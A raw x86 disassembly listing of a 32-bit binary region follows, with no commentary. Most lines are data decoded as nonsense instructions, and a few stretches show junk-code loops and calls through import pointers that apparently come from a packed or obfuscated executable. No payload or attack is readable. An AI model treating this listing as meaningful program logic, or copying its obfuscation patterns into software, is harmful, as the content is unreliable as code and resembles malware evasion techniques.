  40aa88:	sub    DWORD PTR ds:0x4345f3,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x4346fb
  40aa9b:	sub    ebx,DWORD PTR ds:0x43470b
  40aaa1:	mov    DWORD PTR ds:0x4346fb,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x4346bb
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	dec    edx
  40aacb:	and    DWORD PTR gs:[ecx],ecx
  40aace:	cld    
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	pushf  
  40aad7:	les    edi,FWORD PTR ss:[esi]
  40aada:	imul   BYTE PTR [ebx+0x75a03aa0]
  40aae0:	arpl   WORD PTR [ecx-0x33afbcf9],bx
  40aae6:	aas    
  40aae7:	mov    bh,0xd3
  40aae9:	jp     0xc3669df7
  40aaef:	or     bh,BYTE PTR [edi]
  40aaf1:	or     cl,BYTE PTR [edx-0x13]
  40aaf4:	sub    dl,BYTE PTR [ebp-0x35]
  40aaf7:	rcr    DWORD PTR [esi],cl
  40aaf9:	mov    al,0x7e
  40aafb:	lea    eax,[eax+0x4de3c06e]
  40ab01:	ret    
  40ab02:	mov    eax,ds:0x1385d559
  40ab07:	mov    ds:0xd603e49f,eax
  40ab0c:	pop    edx
  40ab0d:	lods   al,BYTE PTR ds:[esi]
  40ab0e:	cmp    BYTE PTR [eax],dh
  40ab10:	mov    dh,0xfc
  40ab12:	stos   BYTE PTR es:[edi],al
  40ab13:	mov    esi,0x71b01166
  40ab18:	sub    al,BYTE PTR ds:0x8ca7c6b8
  40ab1e:	add    eax,0x73620344
  40ab23:	lock ja 0x40ab10
  40ab26:	jg     0x40ab52
  40ab28:	leave  
  40ab29:	sub    al,BYTE PTR [eax-0x28]
  40ab2c:	xor    dh,BYTE PTR [ecx-0x3e]
  40ab2f:	nop
  40ab30:	icebp  
  40ab31:	jecxz  0x40ab62
  40ab33:	pop    ebp
  40ab34:	ins    BYTE PTR es:[edi],dx
  40ab35:	js     0x40ab78
  40ab37:	inc    ebp
  40ab38:	jo     0x40ab72
  40ab3a:	pop    esp
  40ab3b:	add    al,0xc7
  40ab3d:	pop    esp
  40ab3e:	xor    BYTE PTR [eax],ch
  40ab40:	loope  0x40ab25
  40ab42:	inc    ebx
  40ab43:	pusha  
  40ab44:	out    0x19,al
  40ab46:	pop    ebx
  40ab47:	repnz dec edx
  40ab49:	pop    es
  40ab4a:	cmc    
  40ab4b:	arpl   WORD PTR [ecx+0xb],ax
  40ab4e:	stos   DWORD PTR es:[edi],eax
  40ab4f:	ins    DWORD PTR es:[edi],dx
  40ab50:	cmovg  ebp,DWORD PTR [eax-0x27]
  40ab54:	jmp    0x40ab93
  40ab56:	xchg   esi,eax
  40ab57:	adc    eax,0x5ef33aa5
  40ab5c:	xchg   BYTE PTR [eax-0x4bbba5af],bh
  40ab62:	and    al,0x5a
  40ab64:	fsubr  st(3),st
  40ab66:	cwde   
  40ab67:	add    dh,BYTE PTR ds:0x6bc3c7e1
  40ab6d:	out    0x74,eax
  40ab6f:	imul   ecx,DWORD PTR [edx-0x78],0xffffffa0
  40ab73:	push   ecx
  40ab74:	mov    esi,0x56b007a5
  40ab79:	or     ch,ah
  40ab7b:	outs   dx,BYTE PTR ds:[esi]
  40ab7c:	popa   
  40ab7d:	xor    esp,DWORD PTR [ebx]
  40ab7f:	call   0xfc07:0x7c284f15
  40ab86:	stos   DWORD PTR es:[edi],eax
  40ab87:	es inc ebx
  40ab89:	or     eax,0xabac6179
  40ab8e:	add    ah,BYTE PTR [eax]
  40ab90:	test   eax,0x1dc48e63
  40ab95:	cmc    
  40ab96:	stos   BYTE PTR es:[edi],al
  40ab97:	lods   al,BYTE PTR ds:[esi]
  40ab98:	pop    ebx
  40ab99:	and    ebx,DWORD PTR [ebp+0x636965f5]
  40ab9f:	lock test DWORD PTR [edi+0x64],0x9e6c05ca
  40aba7:	jge    0x40abea
  40aba9:	and    DWORD PTR [ebx-0x3a],ebx
  40abac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abad:	dec    eax
  40abae:	int3   
  40abaf:	je     0x40abb1
  40abb1:	jge    0x40ab9e
  40abb3:	sub    bl,bh
  40abb5:	xor    DWORD PTR ss:[eax-0x6339a3d7],ebx
  40abbc:	enter  0xec32,0x76
  40abc0:	push   edx
  40abc1:	or     esi,DWORD PTR [eax]
  40abc3:	dec    eax
  40abc4:	pop    edi
  40abc5:	imul   ebx,ebp,0x8c3cf838
  40abcb:	bndldx bnd1,[ebx-0x53cf25a8]
  40abd2:	bound  ebp,QWORD PTR [ebp-0x4]
  40abd5:	vdivpd ymm0,ymm2,YMMWORD PTR [ebx]
  40abd9:	add    eax,0xe9544556
  40abde:	jae    0x40ab80
  40abe0:	out    dx,eax
  40abe1:	scas   eax,DWORD PTR es:[edi]
  40abe2:	ds xchg ebp,eax
  40abe4:	inc    eax
  40abe5:	icebp  
  40abe6:	or     edx,DWORD PTR [ebx-0x3e]
  40abe9:	mov    ebp,0xd00afd84
  40abee:	ins    BYTE PTR es:[edi],dx
  40abef:	push   ebp
  40abf0:	sar    DWORD PTR [ebx],cl
  40abf2:	xor    cl,BYTE PTR [ecx-0x5d5031ad]
  40abf8:	dec    ecx
  40abf9:	shr    BYTE PTR [ecx-0x3e],1
  40abfc:	jle    0x40ac70
  40abfe:	mov    ds:0x57b8417a,al
  40ac03:	mov    ds:0xa0d4d263,eax
  40ac08:	(bad)  
  40ac09:	call   0x528c2c78
  40ac0e:	arpl   WORD PTR [eax-0x72fb6790],bp
  40ac14:	mov    ch,0xa3
  40ac16:	retf   
  40ac17:	pop    ebx
  40ac18:	clc    
  40ac19:	cmc    
  40ac1a:	mov    al,ds:0xbf5141ed
  40ac1f:	jo     0x40ac4c
  40ac21:	out    dx,eax
  40ac22:	xchg   DWORD PTR [eax],eax
  40ac24:	inc    esp
  40ac25:	pop    eax
  40ac26:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac28:	or     edx,DWORD PTR [ecx-0x64a65c5a]
  40ac2e:	lods   eax,DWORD PTR ds:[esi]
  40ac2f:	xchg   esp,eax
  40ac30:	inc    edx
  40ac31:	rcl    ch,0xcb
  40ac34:	outs   dx,DWORD PTR ds:[esi]
  40ac35:	sbb    dl,BYTE PTR [edx-0x28]
  40ac38:	push   edx
  40ac39:	das    
  40ac3a:	test   eax,0xb52a3ebe
  40ac3f:	in     eax,dx
  40ac40:	int    0xd9
  40ac42:	jb     0x40ac62
  40ac44:	(bad)
  40ac47:	aas    
  40ac48:	xchg   esi,eax
  40ac49:	xlat   BYTE PTR ds:[ebx]
  40ac4a:	aad    0x57
  40ac4c:	lea    edx,[ebx-0x57502718]
  40ac52:	or     al,0x9f
  40ac54:	mov    cl,0xd
  40ac56:	push   ebp
  40ac57:	and    eax,0x7542e4c6
  40ac5c:	mov    bh,0x5b
  40ac5e:	data16 fsubp st(3),st
  40ac61:	dec    ebx
  40ac62:	lods   eax,DWORD PTR ds:[esi]
  40ac63:	das    
  40ac64:	or     BYTE PTR [esi-0x1],0x14
  40ac68:	ja     0x40acc2
  40ac6a:	adc    DWORD PTR [ebp+ebx*2-0x1811c724],eax
  40ac71:	lea    esp,[ebp+0x4]
  40ac74:	ss mov edx,0x2b453808
  40ac7a:	pushf  
  40ac7b:	stos   BYTE PTR es:[edi],al
  40ac7c:	out    0x36,al
  40ac7e:	push   edi
  40ac7f:	je     0x40acee
  40ac81:	call   DWORD PTR ds:0xae8f0e1f
  40ac87:	js     0x40ac9d
  40ac89:	dec    DWORD PTR [eax]
  40ac8b:	in     al,dx
  40ac8c:	lds    eax,FWORD PTR [ebx]
  40ac8e:	cmp    dl,ah
  40ac90:	inc    esi
  40ac91:	sub    BYTE PTR [ecx],cl
  40ac93:	pop    edi
  40ac94:	xor    BYTE PTR [ebx-0x4],ah
  40ac97:	loope  0x40ac76
  40ac99:	popa   
  40ac9a:	repz xchg dh,cl
  40ac9d:	inc    ebp
  40ac9e:	dec    edi
  40ac9f:	cmp    DWORD PTR [eax-0x6be2f333],ecx
  40aca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aca6:	and    BYTE PTR [edx],al
  40aca8:	nop
  40aca9:	jecxz  0x40ac3a
  40acab:	dec    esp
  40acac:	je     0x40ac51
  40acae:	and    DWORD PTR [esi-0x47],edx
  40acb1:	and    BYTE PTR [ebx],ah
  40acb3:	sub    BYTE PTR [eax+eiz*2+0x7457e344],cl
  40acba:	aas    
  40acbb:	jg     0x40ac9f
  40acbd:	sub    BYTE PTR [ecx-0x1d5f3555],dl
  40acc3:	sahf   
  40acc4:	dec    ebp
  40acc5:	push   edi
  40acc6:	int3   
  40acc7:	fsubr  QWORD PTR [eax+0x1]
  40acca:	aaa    
  40accb:	sbb    si,WORD PTR [esp+ecx*1-0x52]
  40acd0:	add    DWORD PTR [ebx+0x13],esp
  40acd3:	loop   0x40ad07
  40acd5:	cld    
  40acd6:	jge    0x40ad19
  40acd8:	pop    es
  40acd9:	shl    ebx,0x94
  40acdc:	les    esi,FWORD PTR [esi+0x63]
  40acdf:	call   0xcc74:0xce398789
  40ace6:	sahf   
  40ace7:	xchg   ebx,eax
  40ace8:	fwait
  40ace9:	ds xor eax,0x8fbaf6a1
  40acef:	cwde   
  40acf0:	outs   dx,BYTE PTR ds:[esi]
  40acf1:	dec    edx
  40acf2:	mov    eax,0xe9554f9c
  40acf7:	loopne 0x40acc7
  40acf9:	mov    DWORD PTR [eax],ecx
  40acfb:	mov    es,WORD PTR [ebx]
  40acfd:	in     eax,0x48
  40acff:	or     ch,BYTE PTR [edi-0x5ce3c149]
  40ad05:	cmp    DWORD PTR [edi-0x38],edx
  40ad08:	sbb    BYTE PTR [edi],bh
  40ad0a:	out    0x32,eax
  40ad0c:	push   es
  40ad0d:	mov    esi,0xbc90feec
  40ad12:	or     eax,0x741a901e
  40ad17:	lods   al,BYTE PTR ds:[esi]
  40ad18:	popf   
  40ad19:	mov    esp,0x9edcd9f4
  40ad1e:	bnd jbe 0x40acde
  40ad21:	adc    bl,dh
  40ad23:	mov    ebp,0x7f589523
  40ad28:	lahf   
  40ad29:	cdq    
  40ad2a:	das    
  40ad2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad2c:	mov    ch,0xf4
  40ad2e:	adc    al,0xe1
  40ad30:	fucomp st(5)
  40ad32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad33:	pop    ecx
  40ad34:	retf   0x3d5c
  40ad37:	rcr    DWORD PTR [eax],cl
  40ad39:	sar    BYTE PTR [ebx+0x37826a6f],cl
  40ad3f:	mov    eax,0x13c8cfae
  40ad44:	mov    ebx,0xbb35c4aa
  40ad49:	cmp    esi,ebx
  40ad4b:	aad    0x22
  40ad4d:	add    DWORD PTR [eax-0x43],0x60
  40ad51:	or     edi,DWORD PTR [ecx-0x59]
  40ad54:	jbe    0x40ad1c
  40ad56:	or     ah,BYTE PTR [edi+esi*1-0x1e]
  40ad5a:	in     eax,0x6e
  40ad5c:	xchg   edx,eax
  40ad5d:	sahf   
  40ad5e:	out    dx,eax
  40ad5f:	inc    ebx
  40ad60:	sar    edi,cl
  40ad62:	cmp    al,0xe6
  40ad64:	push   cs
  40ad65:	es (bad) 
  40ad67:	test   BYTE PTR [ecx+eiz*4-0x36],0x46
  40ad6c:	pop    ecx
  40ad6d:	inc    eax
  40ad6e:	jp     0x40ad5d
  40ad70:	pop    edx
  40ad71:	aad    0xa1
  40ad73:	fwait
  40ad74:	in     al,0x3e
  40ad76:	ja     0x40add8
  40ad78:	call   0x6a54fe4f
  40ad7d:	mov    fs,esp
  40ad7f:	and    DWORD PTR [ecx+0x72eeffb2],0xffffffd4
  40ad86:	mov    ebp,DWORD PTR [edi-0x34e93cf9]
  40ad8c:	or     eax,0xe0beb2bf
  40ad91:	sub    edx,DWORD PTR [esi+0x4c]
  40ad94:	xor    DWORD PTR [ebp+ecx*4-0x20],ebx
  40ad98:	pop    es
  40ad99:	outs   dx,DWORD PTR ds:[esi]
  40ad9a:	rcl    DWORD PTR [edi+0x79],1
  40ad9d:	add    ch,BYTE PTR [ebx+0xa968adf]
  40ada3:	and    edx,esi
  40ada5:	pop    ebx
  40ada6:	xchg   ecx,eax
  40ada7:	inc    eax
  40ada8:	cmp    DWORD PTR [edi+0x45621046],eax
  40adae:	pop    es
  40adaf:	and    eax,0xbc2b55d4
  40adb4:	daa    
  40adb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adb6:	sar    BYTE PTR [esi+0x5215d14f],1
  40adbc:	test   BYTE PTR [ecx+0x6441ce88],dl
  40adc2:	int    0x12
  40adc4:	xchg   edx,eax
  40adc5:	ds mov edx,0xd64337ce
  40adcb:	cld    
  40adcc:	xchg   ecx,eax
  40adcd:	je     0x40adec
  40adcf:	mov    WORD PTR [edx-0x57],es
  40add2:	xchg   edi,eax
  40add3:	mov    dl,0xad
  40add5:	xlat   BYTE PTR ds:[ebx]
  40add6:	das    
  40add7:	div    al
  40add9:	(bad)  
  40adda:	adc    dh,BYTE PTR [edx]
  40addc:	jle    0x40ade0
  40adde:	jecxz  0x40ad64
  40ade0:	fst    QWORD PTR [ebx-0x3b]
  40ade3:	sbb    al,0x62
  40ade5:	call   0xb08d3c57
  40adea:	in     eax,dx
  40adeb:	popa   
  40adec:	or     al,0xa4
  40adee:	mov    cl,0x29
  40adf0:	xchg   esi,eax
  40adf1:	in     eax,dx
  40adf2:	lds    dx,DWORD PTR [esi]
  40adf5:	and    cl,BYTE PTR [ecx*2+0x1e51169b]
  40adfc:	and    dh,dl
  40adfe:	in     eax,0x50
  40ae00:	push   ss
  40ae01:	lock push ebx
  40ae03:	push   ecx
  40ae04:	cld    
  40ae05:	nop
  40ae06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae07:	aaa    
  40ae08:	aas    
  40ae09:	cmp    BYTE PTR [ebx+0x20],ch
  40ae0c:	xchg   ebp,eax
  40ae0d:	and    eax,0x9794fb58
  40ae12:	(bad)  
  40ae13:	sbb    al,0x27
  40ae15:	push   edx
  40ae16:	retf   0xdaf9
  40ae19:	dec    ebp
  40ae1a:	pop    edx
  40ae1b:	fisub  DWORD PTR [edi+0x25]
  40ae1e:	stos   DWORD PTR es:[edi],eax
  40ae1f:	mov    cl,ah
  40ae21:	cmc    
  40ae22:	mov    eax,0x569a3105
  40ae27:	adc    al,ch
  40ae29:	pop    ds
  40ae2a:	in     eax,dx
  40ae2b:	ret    0xd5e2
  40ae2e:	mov    edx,0xd231c724
  40ae33:	pop    edi
  40ae34:	adc    BYTE PTR [esi-0x2fc4868b],0xce
  40ae3b:	scas   eax,DWORD PTR es:[edi]
  40ae3c:	pop    ebp
  40ae3d:	addr16 xchg esp,eax
  40ae3f:	fnstcw WORD PTR gs:[esi+0x2b]
  40ae43:	mov    ebx,0x6364d65
  40ae48:	xlat   BYTE PTR ds:[ebx]
  40ae49:	cli    
  40ae4a:	(bad)  
  40ae4b:	imul   edx,DWORD PTR [esi*2-0x398a6859],0x11348bb7
  40ae56:	test   al,0x7b
  40ae58:	aam    0x38
  40ae5a:	add    ecx,DWORD PTR [ebp+0x31]
  40ae5d:	cwde   
  40ae5e:	push   esi
  40ae5f:	ror    BYTE PTR [ebx-0x3eb2a781],1
  40ae65:	mov    edi,0x1079d30e
  40ae6a:	call   0xb861:0x3930ce74
  40ae71:	je     0x40ae6b
  40ae73:	adc    eax,DWORD PTR [edi]
  40ae75:	mov    ebx,DWORD PTR [eax-0x285a20f5]
  40ae7b:	repz sub esi,DWORD PTR [edi]
  40ae7e:	cmc    
  40ae7f:	cmp    esp,edx
  40ae81:	enter  0xe547,0x57
  40ae85:	xor    ebx,DWORD PTR [edx+0x38]
  40ae88:	cdq    
  40ae89:	xchg   ebx,eax
  40ae8a:	aaa    
  40ae8b:	mov    ds:0x1536237a,al
  40ae90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae91:	xchg   esi,eax
  40ae92:	repnz ins DWORD PTR es:[edi],dx
  40ae94:	call   0x41b809
  40ae99:	cmp    eax,0x2dc808c6
  40ae9e:	xor    eax,0xd94966a5
  40aea3:	popf   
  40aea4:	ins    BYTE PTR es:[edi],dx
  40aea5:	lds    esp,FWORD PTR [eax]
  40aea7:	jecxz  0x40ae7c
  40aea9:	inc    BYTE PTR ds:0xf280e1e9
  40aeaf:	xor    ah,BYTE PTR ds:0x2ebf06d0
  40aeb5:	ficomp DWORD PTR ds:0x6d95906c
  40aebb:	jle    0x40ae99
  40aebd:	push   0x1f9423f3
  40aec2:	xchg   BYTE PTR [edx],bh
  40aec4:	retf   0xfc1e
  40aec7:	out    0xe7,eax
  40aec9:	data16 mov cl,0x31
  40aecc:	fistp  QWORD PTR [edi-0x39]
  40aecf:	rol    DWORD PTR [ebx],0xd1
  40aed2:	imul   edx,edi
  40aed5:	xor    ebx,DWORD PTR ds:0x434653
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x434647,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x43463f,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x4346ff,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43468f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x4345ef,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x43463b,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x434647,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x434647
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x434647,ebx
  40af4d:	cmp    DWORD PTR ds:0x434647,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x434647,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x434677
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43468b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434713,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434713
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434713,ebx
  40afaa:	cmp    DWORD PTR ds:0x434713,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434713,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	add    ah,BYTE PTR [eax]
  40affd:	jmp    0x40b00c
  40afff:	idiv   dl
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	imul   ebx,DWORD PTR [eax+0x248b3f88],0xffffffd1
  40b00e:	mov    WORD PTR [eax-0x20],ds
  40b011:	fdiv   QWORD PTR [edi]
  40b013:	jle    0x40b08d
  40b015:	mov    ch,0x55
  40b017:	imul   edi,DWORD PTR [edx+0x6b2a21b8],0xffffff99
  40b01e:	idiv   bh
  40b020:	xor    eax,0xd43d0ac9
  40b025:	xor    bh,BYTE PTR [edx]
  40b027:	mov    WORD PTR [ebx],?
  40b029:	or     esi,ebx
  40b02b:	pop    ss
  40b02c:	sub    BYTE PTR [ecx+0x50],0xa8
  40b030:	loopne 0x40b015
  40b032:	int3   
  40b033:	mov    ecx,0xf7778db0
  40b038:	aas    
  40b039:	mov    WORD PTR [edi-0x43],cs
  40b03c:	cmp    DWORD PTR [eax+eax*4-0xa95c21],0xa7b832f6
  40b047:	hlt    
  40b048:	mov    eax,0xa1a9a7a4
  40b04d:	push   ebp
  40b04e:	or     al,0x2a
  40b050:	fs push ebx
  40b052:	pusha  
  40b053:	cdq    
  40b054:	push   es
  40b055:	mov    esi,0x36529f15
  40b05a:	xchg   esp,eax
  40b05b:	sub    eax,0xbf205deb
  40b060:	pop    ecx
  40b061:	push   edx
  40b062:	add    al,0x41
  40b064:	scas   eax,DWORD PTR es:[edi]
  40b065:	fistp  WORD PTR [ebp+0x3f57a456]
  40b06b:	imul   eax,DWORD PTR [ecx+0x6a67b500],0xffffff96
  40b072:	call   ebx
  40b074:	pushf  
  40b075:	(bad)  
  40b076:	in     al,dx
  40b077:	jns    0x40b0bc
  40b079:	sub    eax,0xb3583598
  40b07e:	(bad)  
  40b07f:	mov    ebp,0x8a1727b3
  40b084:	jb     0x40b0f1
  40b086:	test   eax,0xbf2d3eff
  40b08b:	in     al,dx
  40b08c:	ins    BYTE PTR es:[edi],dx
  40b08d:	call   0x43a2:0xeaa376d
  40b094:	fbld   TBYTE PTR [edx-0x53]
  40b097:	out    dx,al
  40b098:	mov    dl,0x97
  40b09a:	add    DWORD PTR [ebx],ecx
  40b09c:	sar    esp,cl
  40b09e:	add    al,0xb0
  40b0a0:	push   ebx
  40b0a1:	jmp    0x40b026
  40b0a3:	sets   BYTE PTR [edx]
  40b0a6:	aas    
  40b0a7:	fstp   QWORD PTR [edx+0x40e035fd]
  40b0ad:	dec    esp
  40b0ae:	adc    DWORD PTR [edi+eax*1-0x5e],ebp
  40b0b2:	adc    al,0xc5
  40b0b4:	mov    edi,0x8d49086
  40b0b9:	cmp    al,bl
  40b0bb:	xchg   DWORD PTR [ecx+0x45ec528d],eax
  40b0c1:	add    ch,BYTE PTR [eax+0x43eb4441]
  40b0c7:	dec    ebp
  40b0c8:	test   DWORD PTR [ecx-0x35],0x622c2b76
  40b0cf:	pop    ebx
  40b0d0:	push   ebp
  40b0d1:	mov    BYTE PTR [esp+ebp*8+0x63],0x10
  40b0d6:	mov    DWORD PTR [esi],ebp
  40b0d8:	push   ds
  40b0d9:	inc    esp
  40b0da:	inc    ebx
  40b0db:	call   0x43e2:0x32833297
  40b0e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e3:	popa   
  40b0e4:	addr16 jo 0x40b136
  40b0e7:	mov    BYTE PTR ds:0xe8d89538,cl
  40b0ed:	mov    dh,0x3
  40b0ef:	add    BYTE PTR es:[esi+0x64f15c8d],ah
  40b0f6:	mov    WORD PTR [ebx+ebp*1-0x775b8c22],fs
  40b0fd:	sbb    BYTE PTR [edx+0x25],bh
  40b100:	mov    ch,0xef
  40b103:	cmp    esp,ebx
  40b105:	loope  0x40b157
  40b107:	mov    dl,0x7
  40b109:	cmp    BYTE PTR [eax+0x32],dl
  40b10c:	mov    ?,WORD PTR [ebx]
  40b10e:	scas   eax,DWORD PTR es:[edi]
  40b10f:	push   ebx
  40b110:	sbb    DWORD PTR [ebx+0x5f],0xd1d61fdf
  40b117:	or     DWORD PTR [edi],eax
  40b119:	ins    DWORD PTR es:[edi],dx
  40b11a:	jns    0x40b13a
  40b11c:	nop
  40b11d:	hlt    
  40b11e:	lahf   
  40b11f:	lods   eax,DWORD PTR ds:[esi]
  40b120:	ret    
  40b121:	int3   
  40b122:	mov    al,0xdf
  40b124:	xchg   esi,eax
  40b125:	shl    BYTE PTR [edi-0x40075de1],cl
  40b12b:	data16 add BYTE PTR cs:[ebx-0x33bc64e1],0x89
  40b134:	sti    
  40b135:	adc    BYTE PTR [ecx],dl
  40b137:	iret   
  40b138:	push   eax
  40b139:	aaa    
  40b13a:	ins    DWORD PTR es:[edi],dx
  40b13b:	pop    ds
  40b13c:	inc    ebx
  40b13d:	jnp    0x40b13f
  40b13f:	in     eax,0xf0
  40b141:	mov    eax,0x7950bc5e
  40b146:	shl    DWORD PTR [ecx+0x67],0x39
  40b14a:	or     al,0xe9
  40b14c:	pop    es
  40b14d:	jne    0x40b0f2
  40b14f:	ds mov ch,0x85
  40b152:	mov    ds:0x501c3d8b,al
  40b157:	leave  
  40b158:	out    0xde,eax
  40b15a:	jae    0x40b118
  40b15c:	add    al,BYTE PTR [eax-0xa]
  40b15f:	and    dl,BYTE PTR [ecx-0x72]
  40b162:	mov    ch,0xc5
  40b164:	call   0xde7:0x449ae6b7
  40b16b:	push   edx
  40b16c:	dec    esi
  40b16d:	xchg   ebx,eax
  40b16e:	adc    DWORD PTR [eax-0x43feca8f],esp
  40b174:	jno    0x40b1d4
  40b176:	dec    ecx
  40b177:	xor    al,0x66
  40b179:	mov    ecx,DWORD PTR [ebx-0x5db3d97]
  40b17f:	push   edx
  40b180:	adc    dh,BYTE PTR [edx]
  40b182:	mov    bl,0x97
  40b184:	dec    ebx
  40b185:	retf   
  40b186:	mov    ebx,edi
  40b188:	pop    es
  40b189:	pop    eax
  40b18a:	push   ebx
  40b18b:	pop    ebx
  40b18c:	mov    esp,0x2fa3b5c3
  40b191:	xchg   esi,eax
  40b192:	(bad)  
  40b193:	idiv   BYTE PTR [ebx-0x37ef50bb]
  40b199:	pushf  
  40b19a:	sbb    BYTE PTR [edx-0x54856ff6],0xfa
  40b1a1:	sub    al,0x96
  40b1a3:	gs jle 0x40b1f4
  40b1a6:	fst    DWORD PTR [edi-0x3a]
  40b1a9:	imul   edx,DWORD PTR [edi],0x1010876b
  40b1af:	jns    0x40b21b
  40b1b1:	mov    BYTE PTR [ebp+0x5d62726c],al
  40b1b7:	in     al,dx
  40b1b8:	outs   dx,BYTE PTR ds:[esi]
  40b1b9:	out    dx,al
  40b1ba:	lods   al,BYTE PTR ds:[esi]
  40b1bb:	or     DWORD PTR [edi+0x2156d676],esp
  40b1c1:	add    dh,bh
  40b1c3:	dec    esi
  40b1c4:	push   ds
  40b1c5:	pop    ebp
  40b1c6:	rol    BYTE PTR [ebp-0x72],cl
  40b1c9:	xor    eax,0x905409f2
  40b1ce:	int3   
  40b1cf:	fcmovnbe st,st(7)
  40b1d1:	test   BYTE PTR [ebp+0x31],cl
  40b1d4:	ret    
  40b1d5:	loopne 0x40b236
  40b1d7:	fistp  WORD PTR [ecx]
  40b1d9:	mov    ebx,0x18cea008
  40b1de:	cld    
  40b1df:	pushf  
  40b1e0:	mov    ebp,edi
  40b1e2:	mov    DWORD PTR [ecx-0x494a97ca],edx
  40b1e8:	std    
  40b1e9:	test   eax,0x96bf17ae
  40b1ee:	out    0x67,eax
  40b1f0:	mov    eax,0xd015d730
  40b1f5:	sub    ch,BYTE PTR [esp+eiz*8+0x4af0dc65]
  40b1fc:	in     eax,0x47
  40b1fe:	xor    BYTE PTR [ecx+ecx*4-0x5b],ch
  40b202:	and    eax,0x5ecdce22
  40b207:	and    DWORD PTR [eax-0x62],0x91367397
  40b20e:	lds    ebp,FWORD PTR [esi-0x4c]
  40b211:	mov    bl,0x60
  40b213:	repz adc DWORD PTR [ecx-0x78],0xf33f81bc
  40b21b:	mov    bl,0x4d
  40b21d:	pusha  
  40b21e:	scas   eax,DWORD PTR es:[edi]
  40b21f:	inc    ecx
  40b220:	ins    DWORD PTR es:[edi],dx
  40b221:	pop    ecx
  40b222:	add    eax,0xc642a479
  40b227:	out    0x82,eax
  40b229:	in     al,dx
  40b22a:	cmovp  edx,DWORD PTR [ebx-0x5d1dcdb1]
  40b231:	ds cmp esi,esi
  40b234:	adc    ebp,ebp
  40b236:	adc    eax,0xb741b897
  40b23b:	repz add eax,0xcc0f17dd
  40b241:	inc    edi
  40b242:	popf   
  40b243:	sub    BYTE PTR [eax],al
  40b245:	pop    ebp
  40b246:	popa   
  40b247:	xor    al,0xa1
  40b249:	or     esi,DWORD PTR [edi]
  40b24b:	lea    ebp,[edi+0x58a9c04c]
  40b251:	xchg   BYTE PTR [eax],ch
  40b253:	ret    0x4ec3
  40b256:	cld    
  40b257:	adc    eax,0xc25e7147
  40b25c:	cmp    ecx,ebp
  40b25e:	mov    ah,0x3f
  40b260:	pop    ebx
  40b261:	dec    esi
  40b262:	mov    eax,ds:0xf2147e59
  40b267:	push   edi
  40b268:	add    eax,0x6e9ce3d9
  40b26d:	jnp    0x40b203
  40b26f:	jmp    0x1c3055ee
  40b274:	push   edx
  40b275:	mov    ds,WORD PTR [edi-0xc30592e]
  40b27b:	mov    edx,DWORD PTR [ebx]
  40b27d:	fistp  WORD PTR [eax]
  40b27f:	out    dx,eax
  40b280:	je     0x40b25c
  40b282:	xor    DWORD PTR [ecx],esi
  40b284:	aam    0x89
  40b286:	cld    
